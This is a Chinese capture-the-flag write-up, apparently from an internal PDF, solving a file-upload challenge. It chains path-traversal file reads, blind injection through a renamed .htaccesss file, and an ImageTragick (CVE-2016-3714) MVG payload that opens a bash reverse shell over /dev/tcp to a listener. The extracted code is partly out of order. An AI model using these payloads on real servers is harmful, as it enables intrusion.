# easyupload_wp

# easyupload_wp
---

<!-- page 1 -->

出题思路
 
题目的主要考点为对Apache2的细节设置，在CTF题目中对于.htaccess的考察越来越普遍，但是知识点往
往比较单一，都是利用htaccess禁止php脚本的执行，本题目需要参赛者用一种比较新的方法来利
用.htaccess文件来阅读php文件中的关键信息（盲注）。同时还需要参赛者了解为什么htaccess这个后缀
是用来进行分布式配置的。
参赛者需要对Apache的运行有比较深的理解，能够从题目现象中快速判断原理并能够从官方文档中快速
定位问题，还需要对文档有一个全面的理解，才能找到注入的方式方法。拿到shell后还需要用户了解各
种方法来对disable_functions的绕过，考察参赛者的漏洞查找能力。
漏洞简述
 
网站根目录下有h1nt.jjj , Y0uWi11noTGue3s0ut.jjj 两个文件，利用htaccess将其当做php文件执
行，因此直接访问看不到内容，用户通过robots.txt可以找到h1nt.jjj, 然后通过htaccesss读取它可以得到第
二个文件（预置的shell）
网站将.htaccess文件名修改为了.htaccesss，需要阅读/etc/apache2/apache2.conf来获得这个关键信息, 
POC：
虽然该文件ban掉了一些常用关键字，包括php ，但是可以通过base64来获得完整的文件，POC：
resp = requests.post("http://ip:9999/index.php?action=include", data = 
{"filename": "../../../../../etc/apache2/apache2.conf"}).text
print(resp)
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁


---

<!-- page 2 -->

网站中有组件Imagick组件，可以利用漏洞CVE-2016–3714来执行任意命令，构造的test.mvg参考格式如
下：
完整POC利用
解题步骤
 
1，读取apache配置文件
 
result = "PD89MT0"
f = '''
<If "base64(file('/var/www/html/h1nt.jjj'))=~ /^'''+a+'''/">
ErrorDocument 404 "Errrrr"
</If>
    '''
resp = requests.post("http://ip:9999/index.php?action=upload", files={'file': 
('.htaccesss', f)} )
a = requests.get("http://ip:9999/uploads/" + ip + "/a").text
if "Errrrr" not in a:
    print(result)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|bash -c \'bash -i >& 
/dev/tcp/127.0.0.1/8888 0>&1\'")'
pop graphic-context
url = 'http://ip:9999/Y0uWi11noTGue3s0ut.jjj?
_=file_put_contents(%22/tmp/test.mvg%22,base64_decode(%22cHVzaCBncmFwaGljLWNvbnRle
HQKdmlld2JveCAwIDAgNjQwIDQ4MApmaWxsICd1cmwoaHR0cHM6Ly9leGFtcGxlLmNvbS9pbWFnZS5qcGc
ifGJhc2ggLWMgXCdiYXNoIC1pID4mIC9kZXYvdGNwLzM5Ljk3LjI1MS4xNjgvODg4OCAwPiYxXCciKScKc
G9wIGdyYXBoaWMtY29udGV4dAo=%22));'
s = requests.get(url)
url = 'http://ip:9999/Y0uWi11noTGue3s0ut.jjj?_=var_dump(1);$a=new%20Imagick();$a-
%3EreadImage(%27/tmp/test.mvg%27);$a-%3EwriteImage(%27/tmp/KKKK.png%27);$a-
>clear();$a->destroy();'
s = requests.get(url)
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁


---

<!-- page 3 -->

访问主页，可以直接阅读源码，一般在web题目中都会进行目录的扫描。在robots.txt中可以看到有
h1nt.jjj：
访问只看到有一句"Can you read me?"，说明这份代码被解析了，但是后缀是jjj，可以自然想到
有.htaccess的作用（.htaccess文件可以将任意后缀的文件解析为php代码），出题者提示我们需要读取这
个文件的完整内容。
回到主页，我们可以上传任意后缀的文件，但是上传.htaccess发现无法生效，而且大量的关键词都被过
滤（waf函数）掉了，存在文件包含功能，可以任意文件读，但是读取不到用户上传到uploads目录下的
东西。
综合上面的发现，可以包含apache2.conf，这是apache的配置文件，默认
在/etc/apache2/apache2.conf ，由于include功能是将我们的输入和当前目录拼接起来，因此我们
可以进行任意文件的读取，我们用post方法访问http://39.97.251.168:9999/?action=include ，
携带参数filename=../../../../etc/apache2/apache2.conf 即可
我们可以读取到这些配置：
/var/www的配置中有一条AllowOverride None ，这个配置允许我们使用.htaccess 这样的配置文
件。另一条关键信息是：
因为默认情况下apache使用.htaccess 来当做配置文件使用的，但是我们可以用过更改
AccessFileName 来修改这个配置文件的名字。这里，配置文件的名字被修改为了.htaccesss
2，通过.htaccesss文件盲注获得完整hint
 
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁


---

<!-- page 4 -->

通过包含apache2.conf可以发现htaccess被改名为了htaccesss，如果我们尝试上传文件，会发现set , 
add 等关键字被过滤了，这些关键字都是网上可以找到的EXP中使用的。
但是htaccesss文件还可以用来读取文件，我们采用下面的poc来进行h1nt.php文件的读取。
file函数可以对文件内容进行读取，base64可以对读取出来的文件内容进行base64加密，后面则是对加密
后的内容进行一个匹配，如果匹配上了，那么IF就会生效，此时我们访问一个错误界面，上面只有一句
Errrrr ，否则会返回常规的404 Not Found
我们通过修改a的内容，然后访问一个不存在的路径，就可以判断当前的a对不对。按照exp中的方法不断
进行尝试，可以得到
base64解码后即可得到shell的路径：
3，绕过disable_funtions，读取flag
 
读取h1nt.php后可以得到一个内置的shell，就是上面提取到的Y0uWi11noTGue3s0ut.jjj ，虽然可以
执行php代码，但是我们还不知道flag在哪。由于所有列目录函数都被禁用了，找不到flag，因此需要想
办法绕过，我们查看phpinfo，可以看到有一个Imagick组件，这个组件的版本是存在漏洞的。利用CVE-
2016–3714可以成功的反弹shell，此时我们可以查看根目录的文件并读取flag
写入/tmp/test.mvg
(代码中vps的位置和端口需要根据的情况进行修改)
执行命令：
PD89MT09MDskc2hlbGxwYXRoPSdZMHVXaTExbm9UR3VlM3MwdXQuampqJztlY2hvICdDYW4geW91IHJlYW
QgbWU/Jzs/Pgo=
<?=1==0;$shellpath='Y0uWi11noTGue3s0ut.jjj';echo 'Can you read me?';?>
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|bash -c \'bash -i >& /dev/tcp/vps/8888 
0>&1\'")'
pop graphic-context\n
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁


---

<!-- page 5 -->

此时我们在vps上进行监听的8888端口会收到一个返回的shell：
然后就可以执行命令了：
$a=new%20Imagick();$a-%3EreadImage(%27/tmp/test.mvg%27);$a-
%3EwriteImage(%27/tmp/KKKK.png%27);$a->clear();$a->destroy();
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁
